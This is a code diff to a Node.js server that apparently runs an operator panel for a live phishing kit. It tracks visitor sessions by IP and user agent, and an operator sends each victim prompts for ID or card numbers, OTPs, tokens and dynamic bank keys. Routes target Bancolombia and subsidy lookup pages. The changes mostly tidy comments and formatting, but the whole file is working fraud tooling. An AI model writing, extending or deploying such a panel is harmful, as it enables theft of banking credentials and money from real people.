@@ -228,14 +228,13 @@ const server = http.createServer(async (req, res) => {
                     ultimoHeartbeat: Date.now(),
                     userAgent: (req.headers['user-agent'] || '').slice(0, 200),
                     entroEn: previo.entroEn || Date.now(),
-                    paso: previo.paso || 'index' // Conservar el paso si ya existía
+                    paso: previo.paso || 'index'
                 });
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 400, { ok: false }); }
             return;
         }
 
-        // 🔥 ACTUALIZAR PASO (AHORA TAMBIÉN GUARDA EN USUARIOS ACTIVOS)
         if (req.method === 'POST' && url === '/bc/actualizar-paso') {
             try {
                 const { sessionId, paso } = await getBody(req);
@@ -244,10 +243,9 @@ const server = http.createServer(async (req, res) => {
                     if (!estadoSesiones.has(sessionId)) {
                         estadoSesiones.set(sessionId, 'pendiente');
                     }
-                    // Actualizamos también el mapa de usuarios activos para que se vea en la tabla principal
                     const activo = usuariosActivos.get(sessionId) || { ip, entroEn: Date.now(), ultimoHeartbeat: Date.now() };
                     activo.paso = paso;
-                    activo.ultimaAccion = paso; // Esto es lo que muestra la columna "Última acción"
+                    activo.ultimaAccion = paso;
                     usuariosActivos.set(sessionId, activo);
                 }
                 json(res, 200, { ok: true });
@@ -290,15 +288,7 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'GET' && url === '/admin/activos') {
                 const lista = [];
                 for (const [sid, d] of usuariosActivos.entries()) {
-                    lista.push({ 
-                        sessionId: sid, 
-                        ip: d.ip, 
-                        ultimaAccion: d.ultimaAccion, // Aquí se pinta el paso
-                        tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000), 
-                        userAgent: d.userAgent, 
-                        ultimoHeartbeat: d.ultimoHeartbeat,
-                        paso: d.paso
-                    });
+                    lista.push({ sessionId: sid, ip: d.ip, ultimaAccion: d.ultimaAccion, tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000), userAgent: d.userAgent, ultimoHeartbeat: d.ultimoHeartbeat, paso: d.paso });
                 }
                 json(res, 200, { ok: true, activos: lista });
                 return;
@@ -328,12 +318,24 @@ const server = http.createServer(async (req, res) => {
                 const sessionId = decodeURIComponent(matchAccion[1]);
                 try {
                     const { accion } = await getBody(req);
-                    const mapEstados = { ACEPTAR: 'aceptado', RECHAZAR: 'rechazado', OTP: 'otp', TOKEN: 'token', FINALIZAR: 'finalizado', CC_ERROR: 'cc_error', AUTORIZAR: 'autorizacion', PEDIR_CC: 'pedir_cc', PEDIR_DATOS: 'pedir_datos', PEDIR_DINAMICA: 'pedir_dinamica' };
+                    const mapEstados = { 
+                        ACEPTAR: 'aceptado', 
+                        RECHAZAR: 'rechazado', 
+                        OTP: 'otp', 
+                        TOKEN: 'token', 
+                        FINALIZAR: 'finalizado', 
+                        CC_ERROR: 'cc_error', 
+                        AUTORIZAR: 'autorizacion_enviada', // 🔥 Ahora AUTORIZAR solo cambia el estado, no explota
+                        PEDIR_CC: 'pedir_cc', 
+                        PEDIR_DATOS: 'pedir_datos', 
+                        PEDIR_DINAMICA: 'pedir_dinamica' 
+                    };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     const estadoNuevo = mapEstados[accion];
                     estadoSesiones.set(sessionId, estadoNuevo);
                     ultimaAccionSesiones.set(sessionId, accion);
                     agregarLog('accion', { usuario: payload.user, sessionId, accion });
+                    console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
                 } catch (e) { json(res, 400, { ok: false }); }
                 return;
@@ -374,7 +376,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================================
-        // 🔥 RUTAS PARA BANCOLOMBIA Y SUBSIDIO
+        // 🔥 RUTAS PARA BANCOS Y SUBSIDIO
         // ============================================================
         const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
         if (req.method === 'POST' && consultaMatch) {
